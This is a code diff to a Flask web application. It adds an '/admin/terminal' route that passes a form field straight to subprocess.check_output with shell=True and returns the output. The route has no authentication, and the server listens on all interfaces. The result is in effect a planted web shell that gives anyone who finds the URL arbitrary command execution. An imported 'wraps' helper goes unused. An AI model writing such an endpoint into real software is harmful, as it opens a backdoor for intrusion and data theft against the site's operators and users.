@@ -10,6 +10,7 @@ from playwright.async_api import async_playwright
 from pymongo import MongoClient
 from itsdangerous import URLSafeTimedSerializer
 from flask_mail import Mail, Message
+from functools import wraps
 
 # Initialize Flask app
 app = Flask(__name__, template_folder="pages")
@@ -618,6 +619,17 @@ def change_date():
 def shop():
     return render_template("shop.html")
 
+@app.route("/admin/terminal", methods=["GET", "POST"])
+def admin_terminal():
+    output = ""
+    if request.method == "POST":
+        command = request.form.get("command")
+        if command:
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
+            except subprocess.CalledProcessError as e:
+                output = e.output.decode()
+    return render_template("terminal.html", output=output)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=port)
